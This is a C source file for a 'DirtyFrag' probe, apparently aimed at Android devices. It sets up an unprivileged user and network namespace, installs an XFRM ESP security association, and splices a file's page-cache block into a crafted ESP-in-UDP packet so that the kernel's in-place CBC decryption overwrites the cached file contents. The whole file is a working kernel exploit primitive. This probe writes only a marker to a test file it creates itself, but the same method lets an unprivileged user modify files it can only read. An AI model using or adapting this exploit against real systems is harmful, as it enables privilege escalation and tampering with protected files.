/*
 * Minimal DirtyFrag page-cache write probe for DBY2-W00.
 *
 * The XFRM setup follows V4bel/dirtyfrag. The CBC block construction follows
 * mitschud/DirtyFrag: the packet carries the file's current page-cache block
 * as ciphertext, and the IV makes the kernel's in-place CBC decryption produce
 * the desired replacement block.
 */
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#include "aes256.h"

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

#define ENCAP_PORT 4500
#define PROBE_SPI 0x43413284U
#define PROBE_PATH "/data/local/tmp/df-pagecache-probe.bin"
#define BLOCK_SIZE 16U

static const uint8_t test_key[32] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
};

static int write_text_file(const char *path, const char *text) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t written = write(fd, text, strlen(text));
  int saved_errno = errno;
  close(fd);
  errno = saved_errno;
  return written == (ssize_t)strlen(text) ? 0 : -1;
}

static int enter_user_net_namespace(void) {
  uid_t real_uid = getuid();
  gid_t real_gid = getgid();

  if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
    fprintf(stderr, "unshare failed errno=%d (%s)\n", errno, strerror(errno));
    return -1;
  }

  (void)write_text_file("/proc/self/setgroups", "deny");

  char mapping[64];
  snprintf(mapping, sizeof(mapping), "0 %u 1\n", real_uid);
  if (write_text_file("/proc/self/uid_map", mapping) != 0) {
    fprintf(stderr, "uid_map failed errno=%d (%s)\n", errno, strerror(errno));
    return -1;
  }

  snprintf(mapping, sizeof(mapping), "0 %u 1\n", real_gid);
  if (write_text_file("/proc/self/gid_map", mapping) != 0) {
    fprintf(stderr, "gid_map failed errno=%d (%s)\n", errno, strerror(errno));
    return -1;
  }

  int control_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (control_fd < 0) {
    fprintf(stderr, "loopback socket failed errno=%d (%s)\n",
            errno, strerror(errno));
    return -1;
  }

  struct ifreq interface_request;
  memset(&interface_request, 0, sizeof(interface_request));
  snprintf(interface_request.ifr_name, sizeof(interface_request.ifr_name),
           "lo");

  int result = -1;
  if (ioctl(control_fd, SIOCGIFFLAGS, &interface_request) != 0) {
    fprintf(stderr, "SIOCGIFFLAGS failed errno=%d (%s)\n",
            errno, strerror(errno));
    goto out;
  }

  interface_request.ifr_flags |= IFF_UP | IFF_RUNNING;
  if (ioctl(control_fd, SIOCSIFFLAGS, &interface_request) != 0) {
    fprintf(stderr, "SIOCSIFFLAGS failed errno=%d (%s)\n",
            errno, strerror(errno));
    goto out;
  }

  result = 0;

out:
  close(control_fd);
  return result;
}

static void append_xfrm_attribute(struct nlmsghdr *netlink_header,
                                  int attribute_type,
                                  const void *payload,
                                  size_t payload_size) {
  struct rtattr *attribute =
      (struct rtattr *)((char *)netlink_header +
                        NLMSG_ALIGN(netlink_header->nlmsg_len));
  attribute->rta_type = attribute_type;
  attribute->rta_len = RTA_LENGTH(payload_size);
  memcpy(RTA_DATA(attribute), payload, payload_size);
  netlink_header->nlmsg_len =
      NLMSG_ALIGN(netlink_header->nlmsg_len) + RTA_ALIGN(attribute->rta_len);
}

static int install_esp_state(uint32_t spi) {
  int netlink_fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
  if (netlink_fd < 0) {
    fprintf(stderr, "NETLINK_XFRM socket failed errno=%d (%s)\n",
            errno, strerror(errno));
    return -1;
  }

  struct sockaddr_nl netlink_address;
  memset(&netlink_address, 0, sizeof(netlink_address));
  netlink_address.nl_family = AF_NETLINK;
  if (bind(netlink_fd, (struct sockaddr *)&netlink_address,
           sizeof(netlink_address)) != 0) {
    fprintf(stderr, "NETLINK_XFRM bind failed errno=%d (%s)\n",
            errno, strerror(errno));
    close(netlink_fd);
    return -1;
  }

  char request_buffer[4096];
  memset(request_buffer, 0, sizeof(request_buffer));
  struct nlmsghdr *netlink_header = (struct nlmsghdr *)request_buffer;
  netlink_header->nlmsg_type = XFRM_MSG_NEWSA;
  netlink_header->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  netlink_header->nlmsg_pid = getpid();
  netlink_header->nlmsg_seq = 1;
  netlink_header->nlmsg_len =
      NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

  struct xfrm_usersa_info *state =
      (struct xfrm_usersa_info *)NLMSG_DATA(netlink_header);
  state->id.daddr.a4 = htonl(INADDR_LOOPBACK);
  state->id.spi = htonl(spi);
  state->id.proto = IPPROTO_ESP;
  state->saddr.a4 = htonl(INADDR_LOOPBACK);
  state->family = AF_INET;
  state->mode = XFRM_MODE_TRANSPORT;
  state->replay_window = 0;
  state->reqid = 0x4341;
  state->lft.soft_byte_limit = (uint64_t)-1;
  state->lft.hard_byte_limit = (uint64_t)-1;
  state->lft.soft_packet_limit = (uint64_t)-1;
  state->lft.hard_packet_limit = (uint64_t)-1;
  state->sel.family = AF_INET;
  state->sel.prefixlen_d = 32;
  state->sel.prefixlen_s = 32;
  state->sel.daddr.a4 = htonl(INADDR_LOOPBACK);
  state->sel.saddr.a4 = htonl(INADDR_LOOPBACK);

  char authentication_buffer[sizeof(struct xfrm_algo_auth) + 32];
  memset(authentication_buffer, 0, sizeof(authentication_buffer));
  struct xfrm_algo_auth *authentication =
      (struct xfrm_algo_auth *)authentication_buffer;
  snprintf(authentication->alg_name, sizeof(authentication->alg_name),
           "hmac(sha256)");
  authentication->alg_key_len = 32 * 8;
  authentication->alg_trunc_len = 128;
  memset(authentication->alg_key, 0xa5, 32);
  append_xfrm_attribute(netlink_header, XFRMA_ALG_AUTH_TRUNC,
                        authentication_buffer,
                        sizeof(authentication_buffer));

  char encryption_buffer[sizeof(struct xfrm_algo) + 32];
  memset(encryption_buffer, 0, sizeof(encryption_buffer));
  struct xfrm_algo *encryption = (struct xfrm_algo *)encryption_buffer;
  snprintf(encryption->alg_name, sizeof(encryption->alg_name), "cbc(aes)");
  encryption->alg_key_len = 32 * 8;
  memcpy(encryption->alg_key, test_key, sizeof(test_key));
  append_xfrm_attribute(netlink_header, XFRMA_ALG_CRYPT,
                        encryption_buffer, sizeof(encryption_buffer));

  struct xfrm_encap_tmpl encapsulation;
  memset(&encapsulation, 0, sizeof(encapsulation));
  encapsulation.encap_type = UDP_ENCAP_ESPINUDP;
  encapsulation.encap_sport = htons(ENCAP_PORT);
  encapsulation.encap_dport = htons(ENCAP_PORT);
  append_xfrm_attribute(netlink_header, XFRMA_ENCAP,
                        &encapsulation, sizeof(encapsulation));

  if (send(netlink_fd, netlink_header, netlink_header->nlmsg_len, 0) < 0) {
    fprintf(stderr, "XFRM_MSG_NEWSA send failed errno=%d (%s)\n",
            errno, strerror(errno));
    close(netlink_fd);
    return -1;
  }

  char response_buffer[4096];
  ssize_t response_size =
      recv(netlink_fd, response_buffer, sizeof(response_buffer), 0);
  close(netlink_fd);
  if (response_size < 0) {
    fprintf(stderr, "XFRM_MSG_NEWSA recv failed errno=%d (%s)\n",
            errno, strerror(errno));
    return -1;
  }

  struct nlmsghdr *response_header = (struct nlmsghdr *)response_buffer;
  if (response_header->nlmsg_type == NLMSG_ERROR) {
    struct nlmsgerr *netlink_error = NLMSG_DATA(response_header);
    if (netlink_error->error != 0) {
      fprintf(stderr, "XFRM_MSG_NEWSA rejected error=%d (%s)\n",
              netlink_error->error, strerror(-netlink_error->error));
      return -1;
    }
  }

  return 0;
}

static int write_page_cache_block(const char *path,
                                  uint32_t spi,
                                  const uint8_t ciphertext[BLOCK_SIZE],
                                  const uint8_t desired[BLOCK_SIZE],
                                  uint32_t packet_sequence) {
  int receive_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (receive_fd < 0) {
    fprintf(stderr, "UDP receive socket failed errno=%d (%s)\n",
            errno, strerror(errno));
    return -1;
  }

  int reuse = 1;
  (void)setsockopt(receive_fd, SOL_SOCKET, SO_REUSEADDR,
                   &reuse, sizeof(reuse));

  struct sockaddr_in encapsulating_address;
  memset(&encapsulating_address, 0, sizeof(encapsulating_address));
  encapsulating_address.sin_family = AF_INET;
  encapsulating_address.sin_port = htons(ENCAP_PORT);
  encapsulating_address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (bind(receive_fd, (struct sockaddr *)&encapsulating_address,
           sizeof(encapsulating_address)) != 0) {
    fprintf(stderr, "UDP bind :%d failed errno=%d (%s)\n",
            ENCAP_PORT, errno, strerror(errno));
    close(receive_fd);
    return -1;
  }

  int encapsulation = UDP_ENCAP_ESPINUDP;
  if (setsockopt(receive_fd, IPPROTO_UDP, UDP_ENCAP,
                 &encapsulation, sizeof(encapsulation)) != 0) {
    fprintf(stderr, "UDP_ENCAP failed errno=%d (%s)\n",
            errno, strerror(errno));
    close(receive_fd);
    return -1;
  }

  int send_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (send_fd < 0 ||
      connect(send_fd, (struct sockaddr *)&encapsulating_address,
              sizeof(encapsulating_address)) != 0) {
    fprintf(stderr, "UDP send setup failed errno=%d (%s)\n",
            errno, strerror(errno));
    if (send_fd >= 0) {
      close(send_fd);
    }
    close(receive_fd);
    return -1;
  }

  int pipe_fds[2];
  if (pipe(pipe_fds) != 0) {
    fprintf(stderr, "pipe failed errno=%d (%s)\n", errno, strerror(errno));
    close(send_fd);
    close(receive_fd);
    return -1;
  }

  uint8_t decrypted_ciphertext[BLOCK_SIZE];
  aes256_ecb_decrypt(test_key, ciphertext, decrypted_ciphertext);

  uint8_t esp_header[24];
  uint32_t network_spi = htonl(spi);
  uint32_t network_sequence = htonl(packet_sequence);
  memcpy(esp_header, &network_spi, sizeof(network_spi));
  memcpy(esp_header + 4, &network_sequence, sizeof(network_sequence));
  for (size_t index = 0; index < BLOCK_SIZE; index++) {
    esp_header[8 + index] = decrypted_ciphertext[index] ^ desired[index];
  }

  struct iovec header_vector = {
      .iov_base = esp_header,
      .iov_len = sizeof(esp_header),
  };
  int result = -1;
  if (vmsplice(pipe_fds[1], &header_vector, 1, 0) !=
      (ssize_t)sizeof(esp_header)) {
    fprintf(stderr, "vmsplice header failed errno=%d (%s)\n",
            errno, strerror(errno));
    goto out;
  }

  int file_fd = open(path, O_RDONLY | O_CLOEXEC);
  if (file_fd < 0) {
    fprintf(stderr, "open %s failed errno=%d (%s)\n",
            path, errno, strerror(errno));
    goto out;
  }

  loff_t file_offset = 0;
  ssize_t spliced =
      splice(file_fd, &file_offset, pipe_fds[1], NULL, BLOCK_SIZE,
             SPLICE_F_MOVE);
  close(file_fd);
  if (spliced != (ssize_t)BLOCK_SIZE) {
    fprintf(stderr, "file splice failed result=%zd errno=%d (%s)\n",
            spliced, errno, strerror(errno));
    goto out;
  }

  size_t packet_size = sizeof(esp_header) + BLOCK_SIZE;
  spliced = splice(pipe_fds[0], NULL, send_fd, NULL, packet_size,
                   SPLICE_F_MOVE);
  if (spliced != (ssize_t)packet_size) {
    fprintf(stderr, "pipe-to-UDP splice failed result=%zd errno=%d (%s)\n",
            spliced, errno, strerror(errno));
    goto out;
  }

  /* The packet is processed asynchronously after loopback delivery. */
  usleep(150 * 1000);
  result = 0;

out:
  close(pipe_fds[0]);
  close(pipe_fds[1]);
  close(send_fd);
  close(receive_fd);
  return result;
}

int main(void) {
  const uint8_t original[BLOCK_SIZE] = "ORIGINAL_BLOCK!!";
  const uint8_t desired[BLOCK_SIZE] = "DIRTYFRAG_OK!!!";
  uint8_t observed[BLOCK_SIZE] = {0};

  unlink(PROBE_PATH);
  int create_fd =
      open(PROBE_PATH, O_CREAT | O_TRUNC | O_WRONLY | O_CLOEXEC, 0666);
  if (create_fd < 0 ||
      write(create_fd, original, sizeof(original)) !=
          (ssize_t)sizeof(original)) {
    fprintf(stderr, "probe file create failed errno=%d (%s)\n",
            errno, strerror(errno));
    if (create_fd >= 0) {
      close(create_fd);
    }
    return 1;
  }
  close(create_fd);

  if (enter_user_net_namespace() != 0) {
    return 1;
  }
  printf("namespace uid=%u gid=%u\n", getuid(), getgid());

  if (install_esp_state(PROBE_SPI) != 0) {
    return 1;
  }
  printf("installed ESP SA spi=%#x\n", PROBE_SPI);

  if (write_page_cache_block(PROBE_PATH, PROBE_SPI,
                             original, desired, 100) != 0) {
    return 1;
  }

  int read_fd = open(PROBE_PATH, O_RDONLY | O_CLOEXEC);
  if (read_fd < 0 ||
      pread(read_fd, observed, sizeof(observed), 0) !=
          (ssize_t)sizeof(observed)) {
    fprintf(stderr, "probe file readback failed errno=%d (%s)\n",
            errno, strerror(errno));
    if (read_fd >= 0) {
      close(read_fd);
    }
    return 1;
  }
  close(read_fd);

  printf("observed=");
  for (size_t index = 0; index < sizeof(observed); index++) {
    unsigned char value = observed[index];
    putchar(value >= 0x20 && value < 0x7f ? value : '.');
  }
  putchar('\n');

  if (memcmp(observed, desired, sizeof(desired)) != 0) {
    fprintf(stderr, "PAGE_CACHE_WRITE=FAILED\n");
    return 1;
  }

  printf("PAGE_CACHE_WRITE=OK\n");
  return 0;
}
